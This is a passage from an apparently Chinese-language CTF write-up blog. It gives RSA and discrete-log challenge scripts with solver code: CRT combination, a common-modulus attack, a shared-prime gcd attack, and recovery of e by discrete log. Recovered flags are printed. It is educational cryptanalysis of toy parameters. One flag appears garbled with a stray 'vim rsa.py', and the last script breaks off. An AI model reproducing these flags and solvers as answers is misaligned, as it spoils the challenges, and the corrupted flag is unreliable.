class="built_in">print</span>(gmpy2.gcd(e1, (p - <span class="number">1</span>) * (q1 - <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">e1 = e1 // <span class="number">14</span></span><br><span class="line">e2 = e2 // <span class="number">14</span></span><br><span class="line"></span><br><span class="line">d1 = gmpy2.invert(e1, (p - <span class="number">1</span>) * (q1 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e2, (p - <span class="number">1</span>) * (q2 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">nn = []</span><br><span class="line">aa = []</span><br><span class="line">nn.append(q1)</span><br><span class="line">nn.append(q2)</span><br><span class="line">a1 = gmpy2.powmod(c1, d1, p * q1) % q1</span><br><span class="line">a2 = gmpy2.powmod(c2, d2, p * q2) % q2</span><br><span class="line">aa.append(a1)</span><br><span class="line">aa.append(a2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exCRT_getequation</span>(<span class="params">a, n</span>):</span><br><span class="line">    a1 = a[<span class="number">0</span>]</span><br><span class="line">    n1 = n[<span class="number">0</span>]</span><br><span class="line">    le = <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, le):</span><br><span class="line">        a2 = a[i]</span><br><span class="line">        n2 = n[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> merge(a1, n1, a2, n2):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        a1 = a3</span><br><span class="line">        n1 = n3</span><br><span class="line">    <span class="keyword">return</span> (a1, n1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m14, n = exCRT_getequation(aa, nn)  <span class="comment"># 最终方程组 aa=n^14%q1*q2</span></span><br><span class="line"></span><br><span class="line">m2 = <span class="built_in">pow</span>(m14, gmpy2.invert(<span class="number">7</span>, (q1 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)), n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.isqrt(m2)))</span><br><span class="line"><span class="comment"># de1ctf&#123;9b10a98b-71bb-4bdf-a6ff-f319943de21f&#125;</span></span><br></pre></td></tr></table></figure><h4 id="QCTF2018-Xman-RSA"><a href="#QCTF2018-Xman-RSA" class="headerlink" title="[QCTF2018]Xman-RSA"></a>[QCTF2018]Xman-RSA</h4><p>纳尼，没给出加密脚本？哦，原来是加密脚本也加密了。。。</p><p>看起来第一步是进行词频分析呀，这么大的内容</p><p><img src="/2021/05/28/CTF//image-20210729211301798.png"></p><p>把第一个再拿出来改一改就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_num</span>(<span class="params">b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(b.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num_to_bytes</span>(<span class="params">n</span>):</span><br><span class="line">    b = <span class="built_in">hex</span>(n)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    b = <span class="string">&#x27;0&#x27;</span> + b <span class="keyword">if</span> <span class="built_in">len</span>(b) % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">    <span class="keyword">return</span> b.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_a_prime</span>(<span class="params">l</span>):</span><br><span class="line">    random_seed = urandom(l)</span><br><span class="line">    num = bytes_to_num(random_seed)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_prime(num):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">s, e, n</span>):</span><br><span class="line">    p = bytes_to_num(s)</span><br><span class="line">    p = <span class="built_in">pow</span>(p, e, n)</span><br><span class="line">    <span class="keyword">return</span> num_to_bytes(p).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">separate</span>(<span class="params">n</span>):</span><br><span class="line">    p = n % <span class="number">4</span></span><br><span class="line">    t = (p * p) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">msg1 = <span class="string">&quot;&quot;</span></span><br><span class="line">msg2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> separate(i):</span><br><span class="line">        msg2 += flag[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg1 += flag[i]</span><br><span class="line">p1 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p2 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p3 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n1 = p1 * p2</span><br><span class="line">n2 = p1 * p3</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">c1 = encrypt(msg1, e, n1)</span><br><span class="line">c2 = encrypt(msg2, e, n2)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">p4 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p5 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n3 = p4 * p5</span><br><span class="line">c1 = num_to_bytes(<span class="built_in">pow</span>(n1, e1, n3)).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">c2 = num_to_bytes(<span class="built_in">pow</span>(n1, e2, n3)).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(num_to_bytes(n2)))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(num_to_bytes(n3)))</span><br></pre></td></tr></table></figure><p>然后就是分析了，脚本很简单，先共模攻击获得n1，然后n2也可以有了，然后有msg1、msg2，然后根据他的分离的判定条件将两部分msg合并一下就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def bytes_to_num(b):</span></span><br><span class="line"><span class="string">    return int(b.encode(&#x27;hex&#x27;), 16)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def num_to_bytes(n):</span></span><br><span class="line"><span class="string">    b = hex(n)[2:-1]</span></span><br><span class="line"><span class="string">    b = &#x27;0&#x27; + b if len(b) % 2 == 1 else b</span></span><br><span class="line"><span class="string">    return b.decode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_a_prime(l):</span></span><br><span class="line"><span class="string">    random_seed = urandom(l)</span></span><br><span class="line"><span class="string">    num = bytes_to_num(random_seed)</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        if is_prime(num):</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    num += 1</span></span><br><span class="line"><span class="string">    return num</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def encrypt(s, e, n):</span></span><br><span class="line"><span class="string">    p = bytes_to_num(s)</span></span><br><span class="line"><span class="string">    p = pow(p, e, n)</span></span><br><span class="line"><span class="string">    return num_to_bytes(p).encode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def separate(n):</span></span><br><span class="line"><span class="string">    p = n % 4</span></span><br><span class="line"><span class="string">    t = (p * p) % 4</span></span><br><span class="line"><span class="string">    return t == 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">f = open(&#x27;flag.txt&#x27;, &#x27;r&#x27;)</span></span><br><span class="line"><span class="string">flag = f.read()</span></span><br><span class="line"><span class="string">msg1 = &quot;&quot;</span></span><br><span class="line"><span class="string">msg2 = &quot;&quot;</span></span><br><span class="line"><span class="string">for i in range(len(flag)):</span></span><br><span class="line"><span class="string">    if separate(i):</span></span><br><span class="line"><span class="string">        msg2 += flag[i]</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        msg1 += flag[i]</span></span><br><span class="line"><span class="string">p1 = get_a_prime(128)</span></span><br><span class="line"><span class="string">p2 = get_a_prime(128)</span></span><br><span class="line"><span class="string">p3 = get_a_prime(128)</span></span><br><span class="line"><span class="string">n1 = p1 * p2</span></span><br><span class="line"><span class="string">n2 = p1 * p3</span></span><br><span class="line"><span class="string">e = 0x1001</span></span><br><span class="line"><span class="string">c1 = encrypt(msg1, e, n1)</span></span><br><span class="line"><span class="string">c2 = encrypt(msg2, e, n2)</span></span><br><span class="line"><span class="string">print(c1)</span></span><br><span class="line"><span class="string">print(c2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 下面的对n1加密，使用相同的n3，不同的e，可以使用共模攻击来打。</span></span><br><span class="line"><span class="string">e1 = 0x1001</span></span><br><span class="line"><span class="string">e2 = 0x101</span></span><br><span class="line"><span class="string">p4 = get_a_prime(128)</span></span><br><span class="line"><span class="string">p5 = get_a_prime(128)</span></span><br><span class="line"><span class="string">n3 = p4 * p5</span></span><br><span class="line"><span class="string">c1 = num_to_bytes(pow(n1, e1, n3)).encode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string">c2 = num_to_bytes(pow(n1, e2, n3)).encode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string">print(c1)</span></span><br><span class="line"><span class="string">print(c2)</span></span><br><span class="line"><span class="string">print(base64.b64encode(num_to_bytes(n2)))</span></span><br><span class="line"><span class="string">print(base64.b64encode(num_to_bytes(n3)))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;n2&amp;n3&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    n2 = bytes_to_long(base64.b64decode(data[<span class="number">0</span>]))</span><br><span class="line">    n3 = bytes_to_long(base64.b64decode(data[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;n1.encrypted&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    c1 = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + data[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    c2 = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + data[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">n = n3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ext_euclid</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = ext_euclid(b, a % b)  <span class="comment"># q = gcd(a, b) = gcd(b, a%b)</span></span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">same_mod</span>(<span class="params">n, e1, e2, c1, c2</span>):</span><br><span class="line">    s, t, q = ext_euclid(e1, e2)</span><br><span class="line">    n1 = (gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n)) % n  <span class="comment"># powmod进行大数运算</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n1 =&#x27;</span>, n1)</span><br><span class="line">    <span class="keyword">return</span> n1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1 = same_mod(n, e1, e2, c1, c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n2 =&#x27;</span>, n2)</span><br><span class="line"></span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line">p2 = n1 // p1</span><br><span class="line">p3 = n2 // p1</span><br><span class="line">phi1 = (p1-<span class="number">1</span>) * (p2-<span class="number">1</span>)</span><br><span class="line">phi2 = (p1-<span class="number">1</span>) * (p3-<span class="number">1</span>)</span><br><span class="line">d1 = gmpy2.invert(e, phi1)</span><br><span class="line">d2 = gmpy2.invert(e, phi2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertext&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    c1 = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + data[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    c2 = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + data[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">msg1 = <span class="built_in">str</span>(long_to_bytes(<span class="built_in">pow</span>(c1, d1, n1)))[<span class="number">2</span>:<span class="built_in">len</span>(<span class="built_in">str</span>(long_to_bytes(<span class="built_in">pow</span>(c1, d1, n1)))) - <span class="number">3</span>]</span><br><span class="line">msg2 = <span class="built_in">str</span>(long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2)))[<span class="number">2</span>:<span class="built_in">len</span>(<span class="built_in">str</span>(long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2)))) - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">separate</span>(<span class="params">n</span>):</span><br><span class="line">    p = n % <span class="number">4</span></span><br><span class="line">    t = (p * p) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f1 = <span class="number">0</span></span><br><span class="line">f2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1) + <span class="built_in">len</span>(msg2)):</span><br><span class="line">    <span class="keyword">if</span> separate(i):</span><br><span class="line">        flag += msg2[f2]</span><br><span class="line">        f2 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += msg1[f1]</span><br><span class="line">        f1 += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span></span><br></pre></td></tr></table></figure><h4 id="NPUCTF2020-认清形势，建立信心"><a href="#NPUCTF2020-认清形势，建立信心" class="headerlink" title="[NPUCTF2020]认清形势，建立信心"></a>[NPUCTF2020]认清形势，建立信心</h4><p>给出的题目的脚本为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">25</span>)</span><br><span class="line">e = <span class="comment"># Hidden</span></span><br><span class="line">q = getPrime(<span class="number">25</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(flag.strip(<span class="string">b&quot;npuctf&#123;&quot;</span>).strip(<span class="string">b&quot;&#125;&quot;</span>))</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(<span class="number">2</span>, e, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(<span class="number">4</span>, e, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(<span class="number">8</span>, e, n))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">169169912654178</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">128509160179202</span></span><br><span class="line"><span class="string">518818742414340</span></span><br><span class="line"><span class="string">358553002064450</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>根据第二、三、四的内容可以很简单地求得<code>n</code>、<code>e</code>，解题脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p = getPrime(25)</span></span><br><span class="line"><span class="string">e = # Hidden</span></span><br><span class="line"><span class="string">q = getPrime(25)</span></span><br><span class="line"><span class="string">n = p * q</span></span><br><span class="line"><span class="string">m = bytes_to_long(flag.strip(b&quot;npuctf&#123;&quot;).strip(b&quot;&#125;&quot;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c = pow(m, e, n)</span></span><br><span class="line"><span class="string">print(c)</span></span><br><span class="line"><span class="string">print(pow(2, e, n))</span></span><br><span class="line"><span class="string">print(pow(4, e, n))</span></span><br><span class="line"><span class="string">print(pow(8, e, n))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">169169912654178</span></span><br><span class="line">c2 = <span class="number">128509160179202</span></span><br><span class="line">c4 = <span class="number">518818742414340</span></span><br><span class="line">c8 = <span class="number">358553002064450</span></span><br><span class="line"></span><br><span class="line">n = gmpy2.gcd(c2*c4 - c8, c2 ** <span class="number">2</span> - c4)</span><br><span class="line"><span class="comment"># 1054494004042394&lt;16&gt; = 2 · 18195301 · 28977097</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">28977097</span></span><br><span class="line">q = <span class="number">18195301</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="number">1</span></span><br><span class="line">e = sympy.discrete_log(n, c2, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">808723997</span></span><br><span class="line"><span class="string">b&#x27;345y!&#x27;</span></span><br><span class="line"><span class="string">npuctf&#123;345y!&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>求e可以使用离散对数问题的求解获得。</p><h2 id="离散对数问题"><a href="#离散对数问题" class="headerlink" title="离散对数问题"></a>离散对数问题</h2><blockquote><p>基于离散对数问题的困难问题构造的密码，离散对数问题既是高中时的log问题，幂的逆问题。</p></blockquote><h3 id="一般离散对数问题"><a href="#一般离散对数问题" class="headerlink" title="一般离散对数问题"></a>一般离散对数问题</h3><h4 id="网鼎杯-2020-青龙组-you-raise-me-up"><a href="#网鼎杯-2020-青龙组-you-raise-me-up" class="headerlink" title="[网鼎杯 2020 青龙组]you_raise_me_up"></a>[网鼎杯 2020 青龙组]you_raise_me_up</h4><p>给出的脚本为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br></pre></td></tr></table></figure><p>m是取的随机数，但是最后给出来了，那这个问题就落在了下面的这条语句上面了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = pow(m, bytes_to_long(flag), n)</span><br></pre></td></tr></table></figure><p>既<br>$$<br>c &#x3D; m ^ {flag}\quad mod \quad{n} \<br>也可以当做\<br>m ^ {flag} &#x3D; c\quad mod \quad{n}<br>$$<br>此时欲求得flag，sympy是有专门的函数的，这个函数的用法是<code>flag = sympy.discrete_log(n, c, m)</code>，如此即可求得flag。</p><p>故写解题脚本如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 